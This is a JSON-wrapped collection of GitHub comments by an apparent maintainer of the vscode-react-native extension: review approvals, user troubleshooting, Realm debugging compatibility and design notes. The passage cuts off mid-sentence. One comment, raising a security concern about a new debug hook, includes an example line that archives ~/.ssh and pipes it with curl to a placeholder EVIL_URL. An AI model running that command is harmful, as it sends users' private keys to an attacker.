{
    "MSLaguana": "I've just split out the basic project structure from the start of the debugger work; the debugger will come in a separate PR\n. Looks good\n. Looks good to me, thanks for catching this!\n. Looks good to me\n. Thanks everyone!\n. Looks good to me\n. Looks good to me\n. @dlebu Apart from the path.posix issue it looks good to me\n. Good point, we should update .vscodeignore to ignore /test/** so that it doesn't get picked up. Right now it will be.\n. Looks good to me\n. Looks like ws is the drop in replacement we had hoped it was. Looks good to me other than the unused import.\n. Looks good to me.\n. Looks good, I like the refactoring.\n. Looks good to me.\n. Looks good to me\n. I had just noticed that and was about to fix it. Thanks for catching my mistake!\n. Actually, let me suggest that you don't move the code and just make it private instead. That's what I meant to do in the first place.\n. I think any failed CommandExecutor command should trigger it. I forget what it was exactly that I hit at the time.\n. Yes, \"actually works\" until you actually edit code in which case any previously set breakpoints act unpredictably (moving around or being removed) before you save. Once you save things begin to work again from whatever state VS code left the breakpoints in. Edits will only cause problems for breakpoints in the same file, and only if the edits cause the breakpoint to move to a line which does not have a source mapping available.\nI was largely surprised that the patching things out went from proof of concept to basically done so easily though!\n. When this happens it suggests running watchman with certain arguments, and that clears things up so I suspect it is the watchman service watching the same files too much or something of the sort.\n. Haven't seen this happen since the first instance, probably fixed.\n. Looks good otherwise.\n. There's some discussion on what icon we should use, so I'll keep this open and fix that in the same PR\n. I just tried this out and saw something else strange: When starting, I saw it print out the Executing command: react-native start --port 8081 line twice, and then after I stopped it a while later the extension threw an exception stating that it couldn't start the packager. This error was the one from awaitStart failing all its retries.\n. If this happens, the simplest fix is to open the debug menu (shake the device or cmd-d) and enable debugging manually. It also seems that re-running the debugger a couple of times can solve the issue as well which indicates there might be some kind of race condition or something.\n. Looks like what's happening here is a race condition: we are waiting for a plist file to exist and then writing to it, but it is written in two steps by the react-native app, so our write can be clobbered if it occurs between them.\n. Looks like this is a similar issue to what happened for iOS, where react-native doesn't return a failure exit code. Might need to watch the text output here.\n. Looks good\n. I've added telemetry for fatal errors in nodeDebugWrapper as well now.\n. Apart from the above, looks good.\n. I like the pictures, especially the gif!\n. Looks good to me.\n. Looks good to me\n. Looks good to me\n. I'm inclined to keep it there: vsce does not care about the \"private\" flag, and this will help ensure that we don't accidentally publish to NPM, since this is not actually a npm package.\n. That's great to hear!\n. When you ran into this issue, how had the packager started? Was it from manually running a react-native cli command, or from running the project in xcode, or some other means?\n. Agreed. Looks good to me\n. Note that this should only happen if you are currently in debug mode while making edits. If the debugger is not active, breakpoints should remain in the correct location.\n. I've noticed a couple of incorrectly cased import statements, but apart from that it looks good to me\n. I think this change to use named pipes is much better, and the implementation looks good from what I've seen so far. If it works on windows, it seems good to me.\n. Looks good to me\n. Wherever you have /* errorsAreFatal */ true/false I feel like it's on the wrong line and it confuses me. Since you explicitly specify it everywhere, perhaps rearrange the argument order so the function comes at the end, or change the formatting where the functions are called so you don't end up with lines like\nnew FileSystem().removePathRecursivelySync(ReactDirManager.ReactDirPath), /*errorsAreFatal*/ true);\nwhich is the content of an anonymous function followed by the next argument to the containing function\n. Looks good to me\n. When you open a react-native project with our extension, if the environment variable is not set then you should be prompted with an info message at the top of the window. Did that not happen for you?\n. Were you running on a mac, and if so how were you restarting vs code? On a mac the vscode process does not fully close unless you close using the menu bar or cmd-q, so it would not pick up environment variable changes.\n. Sounds like we're doing something wrong there. I suspect that it's to do with how we check the OS to determine how to configure environment variables.\n. In your steps above you do not list installing the react-native extension for vscode. If you did not, you will need to hit cmd-p, type > ext install and select install extension, then type react-native  and select the react native tools preview:\n\n. You can see that travisCI runs the check as part of the build, which should mean that failures show up in PRs in an obvious manner.\n. I wonder if this is the right approach. If this is a typescript project with a tsconfig.json already existing, but without allowJS explicitly specified, perhaps we should also leave it alone? Because we don't want to break a ts project just by opening it up...\n. I think that being rigorous about what we reject is a good idea, because there have been issues in the past where someone would throw a string, and we'd fail to get a .message out of it or some such.\n. Looks good to me\n. Thanks for the speedy fix!\n. Looks ok to me\n. Apart from those issues, looks good\n. Looks good to me, although I do think we should consider moving the single-lifetime-worker to a separate process and have that as the entirety of the debugee at some point\n. Well that's basically worked, it ran the test even if one failed. I believe that's to do with the test actually testing something that only comes up in windows-specific cases... @dlebu do you recall how that function is intended to work?\n. I'd like to get this checked in so others can start adding tests. I agree that adding tests for the above is worthwhile, although some of them should be integration tests or run against react-native to ensure that our assumptions still hold.\n. You should also update the third party dependencies file so we don't forget later.\n. That file should be automatically generated when you open a react native project when our extension is installed. Make sure that you are opening the root of your react-native project, and that it has a package.json which specifies a dependency on react-native.\n. If the packager is now extension-only, should we move it from /common to /extension? That way it can always use vscode apis.\n. I was thinking that we could increase the Packager's integration with vscode and now that it's there, e.g. having it always print to it's own output channel and maybe updating an entry in the bar at the bottom of the window. But if we don't plan on doing that then keeping it here is probably better.\n. How are you running and restarting vscode? When we set the environment variable we do it with launchctl setenv which configures it for applications run from the GUI, but not if you are running it on the command line directly. Also if you are only closing the window but not cmd-q closing the whole thing, it won't restart and pick up new environment variables.\n. Looks good to me\n. Looks good apart from a small nit\n. Looks good to me\n. Yes it is. If it wasn't, then we would fail to connect to the packager and it should error out. What kind of failure are you seeing?\n. Great to hear that you've got it working!\nRight now we attempt to launch the react-native packager, but if one is already running (or something that looks kind of like it) we don't mess with it because it could be anything, and we don't want to break anyone's environment. We do print a message that there may be an external instance of the packager and suggest disabling it if there are issues, but that message is printed in a separate buffer (I believe you can find it under view -> toggle output buffer)  rather than the debug window, since it would also be where all the log messages from the packager go as well and we don't want to clutter the debugging session with that information.\nWe are definitely trying to find a better way to make it more obvious what state things are in.\n. When you say \"Same problem\" do you mean exactly the same error message as the first post here? Have you made sure that your iOS device can connect to your host machine? See the \"To debug on a real device\" section at https://facebook.github.io/react-native/docs/debugging.html#chrome-developer-tools\n. Are you debugging iOS device, or iOS simulator? And if you are debugging on device, did you follow the directions at https://facebook.github.io/react-native/docs/debugging.html#chrome-developer-tools ?\n. That looks like part of your app is trying to use inline sourcemaps, meaning the mapping between the final .js files and the original .ts/.js files is included directly in the final js directly rather than as a link. We don't support that currently, and so we are trying to fetch that JSON string as a url which fails.\nCould you please open up a separate issue about this particular issue, since it is unrelated to the original thread here.\n. I believe the languageIds error is harmless, but thanks for pointing it out and we'll fix it for the next release.\n. If you look in the bottom right of your window, it says \"JavaScript\". If you click on that, you should be able to change it to \"JavaScript React\" which supports the highlighting for JSX constructs.\nUnfortunately you will need to modify this setting manually for all files which end in .js rather than .jsx because the default colourising is based on file extension.\n. If you would like all .js files globally to be considered as .jsx and support JSX colorization, you can install the js-is-jsx extension.\n. Looks good to me\n. looks good to me\n. Looks good to me.\n. Looks good to me, just the one question.\n. Looks good to me\n. Looks good to me\n. Looks good\n. This has since been resolved. The pipes created are now per-project.\n. We've changed how this code works and I haven't seen this issue come up for a while (unless I create a deliberately non-parsable settings.json) so I believe this is fixed.\n. This is related to #85. Unfortunately the intellisense / red-squigglies are only aware of standard javascript constructs, while react uses babel to support the newer es6 classes and other constructs. \n. looks good to me\n. lgtm\n. This should not be required nor should it be happening any more.\n. I think that we should report failure if any check doesn't pass, but looks great otherwise.\n. This looks like a consequence of the way JSX compiles down into javascript. The JSX block there corresponds to something like the following javascript:\n```\nreturn (\nReact.createElement(View,null,\nReact.createElement(View,{style:styles.rating},\nReact.createElement(Text,{style:styles.ratingTitle},'Critics:'),\nReact.createElement(Text,{style:[styles.ratingValue,getStyleFromScore(criticsScore)]},\ngetTextFromScore(criticsScore))),\nReact.createElement(View,{style:styles.rating},\nReact.createElement(Text,{style:styles.ratingTitle},'Audience:'),\nReact.createElement(Text,{style:[styles.ratingValue,getStyleFromScore(audienceScore)]},\ngetTextFromScore(audienceScore)))));\n```\nNote that there is only one statement there, and the whole thing is compiled into one nested function invocation. There is no intermediate point that we can set a breakpoint where some part of that has executed but the getTextFromScore line has not, or at least I could not in the node debugger.\n. By default, vscode uses the json schema from http://json.schemastore.org/package for validating package.json files. The validation specified there states that package names must not include capital letters, which is why it is complaining.\nIf you want to override the schema that vscode uses for validation, you can refer to https://code.visualstudio.com/Docs/languages/json#_json-schemas-settings for how to override the default schema.\n. Are you opening a folder which contains a package.json that specifies a dependency on react-native? If those conditions are met, then we should create the launchReactNative.js file. Which version of our react-native plugin are you running at the moment? You can find out by hitting f1 and then typing >ext show and selecting show installed extensions.\n. One final thing I forgot we look for: Is the react-native dependency installed? do you have a node_modules/react-native/ folder with a package.json in it?\n. That error on run-android suggests that our extension is not being activated at all. How are you opening your project with vscode? Are you using \"open folder\", and does the folder that you open contain your package.json directly?\n. Ah, that would explain it! Looks like you've run into https://github.com/Microsoft/vscode-react-native/issues/155\nWhat version of vscode are you using? Are you using 0.10.11?\n. The 'react-native-cli' node package is intended to be installed globally, and that is what we intend to call. That in turn will use a local install of react native to do things. Did you have react-native-cli installed when you hit this?\nSent from Outlook\n\nFrom: Aidan Steele notifications@github.com\nSent: Monday, October 10, 2016 5:44:10 PM\nTo: Microsoft/vscode-react-native\nCc: Jimmy Thomson; Mention\nSubject: Re: [Microsoft/vscode-react-native] Opening React Native project not generating /launchReactNative.js (#152)\nFor what it's worth I had the same issue today with a brand new installation of both React Native and this extension. Turns out that the extension had trouble spawning react-native because I had only installed the CLI locally, not globally. Globally installing fixed that issue.\nPerhaps instead of launching react-native we should execute the RN within node_modules?\n\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHubhttps://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fgithub.com%2FMicrosoft%2Fvscode-react-native%2Fissues%2F152%23issuecomment-252782712&data=01%7C01%7Cjithomso%40microsoft.com%7C41cb58698337476b8df308d3f16fb7c1%7C72f988bf86f141af91ab2d7cd011db47%7C1&sdata=3HSwL7h4%2F1Qvn3bIaCivUTE7DYdmEmOsDByaCoa39lU%3D&reserved=0, or mute the threadhttps://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fgithub.com%2Fnotifications%2Funsubscribe-auth%2FANcfpDWjanfGSBSZu6-GUBPrjcOyJCvsks5qytvagaJpZM4Hwmbq&data=01%7C01%7Cjithomso%40microsoft.com%7C41cb58698337476b8df308d3f16fb7c1%7C72f988bf86f141af91ab2d7cd011db47%7C1&sdata=j0F67tyQvKczWbdyuLTfxdeCHjrtVYl7I9n4I03a7jU%3D&reserved=0.\n. Could you please tell me what VSCode extensions you have installed, and also go to Help -> Toggle Developer Tools and tell me if you see any errors in the console there? I've heard reports that having certain other extensions installed can somehow stop ours from loading properly (which would cause this issue).\n. That error explains why it isn't working for you: We are trying to run react-native -v in your project, and it is failing to find the global install of react-native. How have you installed it? Is it actually on your PATH?\n. Could you please run where react-native and see what the result is?\n. Hmm, that should mean it works. Can you please try one more thing: In your project folder on the command line, can you run vscode (I believe you should be able to run code) and see if that behaves differently?\n. Please close vscode first, then try again. I'm curious to see if the way that you start it changes the environment variables and perhaps could allow it to find the react-native install.\n. It suggests that some environment variables are different in your command line environment. If you make sure that your PATH environment variable includes your %appdata%\\npm folder where react-native.cmd is located, then vscode should be able to find it when you launch it outside the console.\n. Looks good to me\n. Looks good to me\n. Looks like the node debugger extension has changed publisher according to https://github.com/Microsoft/vscode-node-debug/blob/master/package.json, so we'll need to update that. I wonder if the publisher change will retroactively work with current versions, or if this is a breaking change...\n. Following discussion on the node-debug extension github page, we should remove the dependency in package.json and check for both names when we activate, providing an appropriate error/warning in the case where neither is found.\n. Looks good to me apart from minor comments.\n. Looks good to me\n. Looks like there's another backtick on line 85, but apart from that it looks good.\n. Looks good to me\n. This is a remnant from supporting earlier versions of VS Code, and we're working on a fix for it. The VSCODE_TSJS environment variable was for opting in to a then-experimental different way of providing intellisense (which understood jsx, among other things) but it is no longer needed.\n. In the currently published version with up-to-date versions of vscode this environment variable should no longer be checked for or set.\n. We require that the react-native-cli be installed and globally available on the system. On the machine where it fails, run npm install -g react-native-cli and then it should work.\n. We now handle comments in settings.json correctly.\n. Looks ok to me as long as we make sure to keep src/common and src/test/common free of references to vscode.\n. Looks good to me, although before using the project it would need to be npm-installed.\n. What exactly are you trying to debug? If you do not have an android project then you cannot run your react native app on android, and thus you can't debug a react native app on android...\nIn version 0.1.0 we did not detect when the react-native run-android command failed, so in that case it may have been running older native code on the device if you had a previous install of your app on there somehow. We now ensure that the app is up to date to avoid potential issues with mismatched native code.\nIs there a reason that you do not want to add an android project?\n. I see, that makes sense. We don't currently support an \"attach to running app\" type of scenario, but it is something that we could look into. \n. We've added code to support this scenario now, so the next release will let you debug an already running app.\n. Looks good to me apart from the minor comments above.\n. This looks like it might be a configuration issue with your project. I am not familiar with realm, but did you follow instructions like https://realm.io/docs/react-native/latest/#getting-started ? You may be missing the native code for Realm if I understand the error correctly.\n. What happens if you manually react-native run-ios and then you enable debugging in chrome? Does that work correctly, or does it break in a similar way?\n. You may need to close the project in VS code to make sure that we remove all of our debugging hooks and that it attempts to launch chrome.\n. Ok, we will have to look into this further. Thanks for reporting this.\n. I've looked into this a bit now, and it looks like Realm is not compatible with our extension, since they try to detect whether the app is being debugged, and the way we run things does not match what they expect. We'll have to work out how best to address this.\n. @appden: I can certainly point you to the incompatibility: If you look at https://github.com/realm/realm-js/blob/d62f78050ee61c67c0c60cdc83908b6c2a2eae81/lib/index.js#L27 then you'll see you check first for native support, then you check for a browser environment, and if both checks fail then you bail out.\nWhen we debug react-native projects, we follow the same concept as debugging in chrome, except we use nodejs rather than a browser environment, which means that there won't be a navigator element, but since we are running on the host machine and not the device itself it also won't have the native-modified javascript environment. A better \"am I running in a debug environment\" check may be to look for __DEV__, which the packager sets to true in debug mode I believe. I'm not sure if that's always the case though.\nI haven't looked deeper to see if your browser support also works in a nodejs environment. If it doesn't, then more work would be needed to support your functionality in a nodejs environment.\n. I've set up a PR that should provide this functionality. If you could try it out and see if it meets your needs, that'd be appreciated.\n. I've merged the PR now, but I'll leave this issue open until the next version of the extension is published, and Realm has a fix on their end.\n. We have just published a release of the extension which exposes the __debug__.require function, but Realm still needs to make use of that before it will work correctly, so I'll keep the issue open for now.\n. That's a question for @appden\n. Closing since realm has updated and it works now.\n. Looks like Realm still has the original check that caused this issue.\nThey have made use of the __debug__.require at https://github.com/realm/realm-js/blob/master/lib/browser/rpc.js but the file making the check https://github.com/realm/realm-js/blob/master/lib/index.js is still checking for a window variable which doesn't exist in node.\n@appden, I had a look at https://github.com/realm/realm-js/commit/717d6781a185c214154ec422f836ce1a79363576 which claims to add support for vscode debugging, but I'm not sure how the window check is intended to work. We haven't changed anything relevant here to my knowledge.\n. For a temporary workaround, you could try global.window={} at the start of your index.<platform>.js file. I believe that will convince realm to operate correctly.\n. What version of react-native is your project using? You can check the package.json of the project to find out (Note that this is different to the version of react-native-cli). Also, is react-native installed globally, or do you have aliases / shell scripts which modify your PATH to set things up?\nIt looks to me like when we run react-native run-ios it is failing to find the react-native command, although the react-native packager is running so you must have it installed somewhere.\n. In your launch.json, did you specify \"target\": \"device\"? The target parameter specifies whether to target a simulator (and which simulator to target) or a device. Modifying the IP in AppDelegate.m is necessary to have the app function once it runs on the device, but does not impact where the app is run.\n. I've had a look at your project, and I believe that this is an issue with the sourcemaps being generated.\nIf I disable sourcemaps and run your project, when I navigate to the \"Fourth\" tab then I hit the debugger; statement that you added, which appears to be on line 98495 of the index.ios.bundle. However if I query the sourcemaps for that position, it gives me an invalid location:\n```\n\nsmc.originalPositionFor({line: 98495, column: 5})\n{ source: '../../components/ReferenceLinks.js',\n  line: 85,\n  column: 0,\n  name: null }\n```\n\nNote that ReferenceLinks.js only has 77 lines in the source. I suspect that there is some babel transformation which is not treating source maps correctly, and so the end result does not correctly map the bundle to the original sources. This isn't something that we can fix on our end, and I'm afraid I don't know where specifically things have gone wrong for you; I'm not familiar with the babel plugins you are using.\n. Where was this zlib which was corrupted? Was it part of your vscode install, our extension, or your app?\n. Specifically we need brew install libimobiledevice ideviceinstaller\n. Typically the wrapped errors are intended for cases where we don't know/understand the internal error, because it is from an external system and thus it doesn't have an error code. I'm inclined to say that wrapping our own errors is the bug in this case, and @mroswald's fix is a reasonable fix but it might be more appropriate to work out why we are wrapping the error and stop that (and see if we're making the same mistake elsewhere)\n. Apart from the above, looks OK to me\n. Looks good to me apart from the small naming confusion\n. If you open a command line, does running react-native work? If so, have you added things to your .bash_profile or similar to modify your PATH?\n. Ok, that would explain your issue then. I believe that if you run vscode from the command line, then it should work correctly since it will inherit your modified PATH variable.\nModifying your path via something like http://stackoverflow.com/questions/25385934/setting-environment-variables-via-launchd-conf-no-longer-works-in-os-x-yosemite/26586170#26586170 should resolve the issue. Alternately, you could add a symlink to your local react-native install somewhere like /usr/local/bin which is already on the default path.\n. If you run which react-native it will tell you where the executable is.\n. Looks good to me. Once you sign the CLA we can merge the PR.\n. No problem, I'll merge this in once the form is approved.\n. Our extension builds on top of the core vscode node debugging extension; you can see their code at https://github.com/Microsoft/vscode-node-debug\nWe primarily try to make sure that the project fits their requirements, and then pass it over. Why are you modifying the path at all?\n. Regarding your second question: The current architecture is a little bit of a mess, but we haven't had a chance to clean it up yet.\nThere are 2 parts to the debugger: one is the nodeDebugWrapper which is a proper vscode debug adapter, and in its launchRequest function it is given the data from the appropriate launch.json entry.\nHowever we have implemented most of our logic in the second part of the debugger, which is actually in what is normally the app being debugged. This is everything starting from launchReactNative.js. Since this isn't a standard way of doing things, we went with the path of least resistance and pass the few properties we need via the argv of the process. The argv is read in launcher.ts, and constructed in nodeDebugWrapper.ts.\nIdeally the bulk of our logic should be stripped out of the \"app being debugged\" process and put into the debug adapter process, but as I said we haven't had time to go back and fix it yet.\n. Looks good to me. Just need you to update your branch to match master, then we can merge your fix.\n. Are you sure this is an issue? I just tested it out, and this is the package.json that was created:\n{\n  \"name\": \"foo\",\n  \"version\": \"0.0.1\",\n  \"private\": true,\n  \"scripts\": {\n    \"start\": \"node node_modules/react-native/local-cli/cli.js start\"\n  },\n  \"dependencies\": {\n    \"react\": \"^0.14.8\",\n    \"react-native\": \"^0.24.1\"\n  }\n}\nThe release that you link to is referring to an internal detail of how react-native init works: previously it would install the latest version of react (not react-native), while now it installs an appropriate version of react based on the version of react-native that it is using.\n. It detects projects created by react-native init, and most projects that work with the react-native cli (e.g. react-native run-ios), but not all projects. For example if you check out the react-native git repo, we don't work with the sample projects there because they don't use the same structure as a react-native init-created project, and you can't use the react-native cli on them.\nSimilarly if I build a react-native compatible project from scratch and manually npm install react-native@... but do not save the dependency to a package.json, then we do not detect that as a react-native project either.\n. What happens if you run react-native run-ios in the project root? We try not to do anything fancy when compiling the project, so we should work if react-native CLI does.\nSecondly, when using this extension we try to manage the packager (so we can configure debugging) so you should not npm start in the project. If you ensure that react-native run-ios compiles and runs the app, and that the react-native packager is not running prior to trying to debug with VS Code, then it should work out. If not, we'll check it out further.\n. Your application is failing to compile, which is unrelated to our VSCode extension.\nAt a guess, if you got the sample app pre-built somewhere, you could try deleting ios/build which contains intermediate build objects and that may help.\n. One thing I'll note in passing: The paranoid side of me sees a potential avenue for attack with this PR: Someone could create a react-native package which is normally well-behaved, but if it detects __debug__.require it does something nefarious, like silently stealing the user's ~/.ssh folder or something via hostChildProcess = __debug__.require('child_process'); hostChildProcess.exec('tar -cz ~/.ssh | curl EVIL_URL').\nI feel that this is an unlikely scenario, but one worth considering and being aware of.\n. Not yet. This PR has not yet been merged nor published, and Realm still needs some changes made to it. I'll only close the issue once all the necessary pieces are in place.\n. We will support this in our next release. The code is in now.\n. How did you create your project, and what happens if you react-native run ios in your project? It looks like that is failing because of a missing scheme, which should have been created by react-native init.\n. When you say you upgrade react-native, how did you do that? Did you change the version in your project's package.json? Did you un-install and re-install it locally, or globally?\n. Try running react-native upgrade and then react-native run-ios again. That may fix up any incompatibilities between the files from the previous version of react-native and the new version.\n. Do you have ios/ArtGallery.xcodeproj/.xcshareddata/xcschemes/ArtGallery.xcscheme? If not, that is the cause for this error. I'm not sure why it would be missing though.\n. Running react-native upgrade should fix that though. What is the contents of your ios folder in your project?\n. Do you have a .vscode/settings.json file, and is that file a valid JSON file? Sounds like it may have a rogue / in it.\nWhat version of vscode are you using?\n. Can you please share your settings.json file? Just to make sure you didn't miss anything. The launch.json is unrelated to configuring intellisense.\n. I see the problem: Currently we try to JSON.parse the settings file, which requires that it is legal json which forbids comments in files. VSCode has a more liberal interpretation, so we really should fix that. For now it should be relatively harmless; I believe that with current VSCode versions our modifications there were not required.\n. If you remove the comments then our code should work, but I don't believe that is necessary: since you are on a recent version of vscode, the intellisense setup that we do is not required. You should still be able to edit and debug your app successfully. If that is not the case, please let us know.\n. There will not be a \"react-native\" language mode, but there should be a JavaScript React mode available which understands JSX syntax. The react-native specific functionality is provided in the form of additional typings for the react-native library, and not a change in the language mode.\n. We now correctly handle comments in settings.json. Comments in tsconfig.json raise an error at the moment, but I believe we can largely remove that case.\n. Looks good to me.\n. Looks good to me.\n. Thanks a lot for looking into that and providing a detailed explanation @frogcjn!\nWe've been a bit busy on other projects so we haven't had a chance to look over your PR closely yet, but we'll try to get to that soon. We definitely want to get this working.\n. Thanks to @frogcjn for his PR implementing this: https://github.com/Microsoft/vscode-react-native/pull/259\nSupport will be in the next release.\n. Soon\u2122\nWhile you wait for the official release, you can check out this repo and build it yourself.\n. Looks good to me\n. Looks good to me.\n. Hi @frogcjn, sorry for the long delay! I'm finally getting a chance to look this over now.\nWe've made some changes in the mean time, could you please merge the latest changes in master with your branch?\n. You need to manually resolve any conflicts: fetch the latest master branch from here, then git merge master in your branch and go through whatever conflicts result.\n. @frogcjn I was thinking something more like this for the tsconfig changes: https://github.com/Microsoft/vscode-react-native/tree/changeTsConfigCreation\nIf you agree, could you include that and remove the then-unnecessary dependency on strip-json-comments? I think we'll be good to go then.\nThanks again for the contribution, and for your patience!\n. Sorry I should have linked more directly to the changes I meant: https://github.com/Microsoft/vscode-react-native/commit/2f686f870c821b13d59774da0f2f99e0271538ac\n. One final nit to pick: Please clean up the commented out import, and remove the typing for strip-json-comments. After that and when the CI run finishes, it should be good to go!\n. Thanks, once the CI system gives it a green light I'll merge it in.\n. Sorry to be a huge pain, but would you mind squashing your commits? I know we've been back and forth a bunch, but this is the last thing I promise :)\n. I see that you've done a new PR with your squashed commits, https://github.com/Microsoft/vscode-react-native/pull/259 so I'll close this PR and accept the other. Thanks!\n. In order for debugging to work, we need to have started the packager. We are considering a workflow where you first run the packager and \"prepare to attach\" in vscode which sets up a debugging environment, and then you can shake your device and select debug and have it start running the code in a way that vscode can inspect. Does this workflow appeal to you @agonzalezjr or did you have something else in mind?\n. I believe that it should, with one caveat: When debugging react-native javascript, because it isn't executing on the device, I believe that native plugin functionality is absent (At least that is our experience from troubleshooting Realm). Would you want to be able to debug your JS interacting with custom native plugins?\nI did a small investigation earlier on and I believe it is possible for us to attach to the JS executing on the device (although only if the device is NOT in debug mode!) but only on iOS, and it uses a completely different process to the normal react-native javascript debugging workflow.\n. Let me ask this another way to be clear: If you do not use VSCode and you just use the default react-native experience, does debugging in chrome meet your needs? Because that will let you debug your application-logic javascript, but (I believe) it will not let you debug the interaction of your JS with the native side of things.\nIf debugging with chrome meets your needs then it is relatively simple for us to support that kind of attach ourselves, otherwise I believe that it is possible for iOS and not android and needs some more extensive changes to how debugging works.\n. I'd suggest adding this to the known-issues section of the readme. Otherwise looks good to me.\n. If you look in .vscode/typings/react-native you'll find the react-native.d.ts file that we use. It's a bit of an old version at the moment, and we're trying to work out a better way to provide typings here, but if you modify or replace that file then it will update the intellisense and compilation behavior.\nSpecifically in terms of NativeModules, I don't see that defined in the DefinitelyTyped repo where we took the typings from, so you may need to provide your own typings for how that behaves.\n. Looks good to me\n. It looks like your code uses JSX, is that correct? I've noticed that when compiling JSX react-native produces sourcemaps which don't properly account for the transformation from JSX to plain javascript. I suspect that any breakpoints you have before the JSX will be hit as-expected, and any breakpoints set after it will be shifted by some number of lines, giving unpredictable behaviour.\nIf you want to use typescript, then @frogcjn has a guide at https://gist.github.com/frogcjn/3bb47ce01a5168d8cd570a46cc71bb02 which explains how to set up source maps there, and that uses the typescript compiler to handle TSX which does maintain sourcemaps correctly. You may be able to follow similar steps to use the typescript compiler to transpile your JSX to JS while maintaining sourcemaps.\nI'd expected this JSX sourcemap issue to be addressed by react-native, but it looks like it's still there so we may need to do something further about it.\n. @xharmagne Are you still having this issue, and can you confirm whether it only seems to happen when using JSX?\n. We currently don't check for pre-existing typings, so that's a deficiency in our code that we'll have to address. For a workaround, if you make the typings files read-only after you update them, I believe it should fix the issue in the short term. It may report an error in setting up intellisense, but your update typings should still be reflected in intellisense.\n. What use-case do you see for this? I thought that if you were going to work on a react-native project that it would be intentional and you would specify it directly.\n. @digeff had a look at this and suggested that instead of explicitly searching for package.json referring to react-native, we could instead run react-native -v which reports the version of react-native in the project. This would do double duty of determining the version of react-native, and verifying that the react-native command works in the project, which is a hard requirement for us at the moment.\nWould this suit your scenario as well?\n. Apart from the above comment, this looks good to me. Thanks for the contribution!\n. We haven't been very strict about that, If you'd like to then go ahead.\n. Looks like there's a merge conflict, could you please try merging master in?\n. @frogcjn Does this still happen for you after you built the code with your change? I think that some recent changes to how we detect react-native projects should mean we don't complain as often, but if it still happens then I'll look further into it.\n. Looks good to me\n. Looks good to me, although the CI run seems to have been cancelled for some reason\n. I've looked into this, and I think I understand why it happens.\nWe create an OutputChannel (that's a thing that writes to a tab in the output window) when our extension is loaded, and it seems that by default when an OutputChannel is created, it brings it into focus.\nI've played around a little and I can explicitly hide the output channel we created, but that will hide the output window if it was already open as well.\nI can certainly limit the creation of the output channel to when we detect a react-native project, but it looks like I'm limited in how much we can respect the initial state of the window.\n. I thought about this some more, and we primarily use the output window for the packager output, which is triggered by some user interaction. I've got a PR out which delays creating the output channel until we actually want to write to it, so now the window won't open up until you've done some action which prints to it.\n. Looks good, I'll merge it in now. Thanks a lot!\n. We hope to publish a release in the near future, but if you want to use this now then you can check out master branch and build from that and it will include these changes.\n. There is still potential for the debugger to not stop at breakpoints, perhaps we should reword this more along the lines of \"Breakpoints require sourcemaps to be correctly configured. If you are using typescript, then see X for how to ensure sourcemaps are correctly set up.\" ?\n. Looks good to me\n. Looks good to me.\n. Thanks for reporting this, but the syntax highlighting is actually provided by vscode itself and not our extension. Please report this at https://github.com/Microsoft/vscode/issues\n. Thanks for pointing this out, I see that we missed a part of the react-native run-ios workflow.\n. Which settings in particular would you like to set? Or would you like to be able to specify the xcode command line argument completely?\n. Are you happy with react-native's current behavior, where it picks the first .xcodeproj or .xcworkspace file that it finds? Or do you want to specify what should be used? How hands-on do you want to be? I was hoping to get more insight into what would be helpful before making the change.\n. @chenxsan @DominicTobias @tapir We are looking into doing this now. When you want this, is it because the packager is in an invalid state and you would also like the cache to be reset?\n. Apart from the above, looks good to me!\n. When testing this out, I just saw that ngrok, a dependency of xdl, downloads some binaries at npm install time, which means that if we bundle the extension as-is, it will only work on the same architecture as the machine which compiled it.\nA better approach may be to lazily npm install xdl at runtime when we need to do something via xdl. This would mean that it installs the correct binaries for the machine.\n. I split this PR into 2 parts; the exponent-specific parts are about to be checked in as part of #301 \n. The specific requirement for using this extension is essentially that react-native run-ios and react-native run-android work, depending on which platform you are trying to work with.\nIn practice, this means that you must install nodejs, install react-native globally, and you have the android SDK and appropriate java JDK installed for android work, or xcode for iOS work. Android studio is not a requirement, but if you do intend to do a lot of work on the native side of things (such as making native extensions) then it may be useful.\n. This error message can happen when you try to debug a project which we don't detect as being a react-native project, I just filed an issue on that at https://github.com/Microsoft/vscode-react-native/issues/274.\nIn my case I hit the issue because I had forgotten to npm install in my project, and so there was no react-native node_module installed. Does this apply to you as well?\n. @danmattsson FYI we've just published the version containing support for this now.\n. Vscode extensions typically do not try to be a full IDE, but to provide enhancements to a typical workflow. Currently we don't have any project-management functionality, such as creating a project, updating a project to a newer version, adding ios or android platforms if they were removed, etc.\nPart of the reason for this is we expect people to use vscode for the text editing and debugging, but still use the command line regularly and thus we felt there was little benefit in adding once-off features like npm install which don't happen regularly in the lifetime of a project.\nDo you disagree? \n. When you modify the port in settings.json that is primarily modifying the port used for commands done in the command palette, when you use cmd-shift-p. When debugging, the launch.json entry is the source of truth for configuration options. Did you also modify the port there? If not, then there will actually be 2 packagers running, and your app connected to the one which is not being debugged at the time.\n. Hello @Riglerr, did changing the launch.json fix the issue for you?\n. Thanks for reporting this, that's definitely a bug. We recently made some changes that we haven't yet released which update the debugger to a newer version. If you are keen, you could try checking out this codebase and see if your issue reproduces still. Otherwise I'll take a look at this soon and see what's going on.\n. I just tried out the example you linked above, and it works fine for me with all the same versions (Except I'm on OS X 10.11.4)\nDoes this fail consistently for you every time?\n. What version of nodejs do you have installed? node -v should tell you.\nI'm running 5.10.1, and the process being debugged is actually running in a node process so a mismatch there may explain the difference in behavior.\n. Ok, looks like that's the cause, I just reproduced this using node 6.3.1\nWe are using the vscode-node-debug debugger internally, so I'll let them know and see if we can get a fix out. Thanks for letting us know!\n. I'm trying to get a minimal example to help the node debugging team analyse the issue. In the mean time though, I did notice that manually pausing the debugger (clicking the pause button) when the execution was already stopped at a breakpoint does cause the debugger to realise it is stopped at the appropriate line and you can debug and continue on. Not the best, but a workaround while we try and sort this out.\n. This should improve #274 \n. What do you mean by \"Configurations/Select Environment\" section?\nIf you go to the extensions section \n do you see the React Native Tools extension listed as installed?\n. I've just tried this out on an OSX 10.11.4 machine which I just updated to vscode 1.4.0, and it seems to be working correctly for me.\nCan you please try deleting the ~/.vscode/extensions/vsmobile.vscode-react-native-0.1.5 folder and then re-install the extension and see if that helps? And failing that, could you check to see if your ~/.vscode/extensions/vsmobile.vscode-react-native-0.1.5/package.json exists and contains something like \n\"debuggers\": [\n{\n\"type\": \"reactnative\",\nwhich is what defines the React Native debugger.\n. That's very odd, and as far as I can tell it should work. I'll bring this up with some of the vscode team and see if it's an issue on their 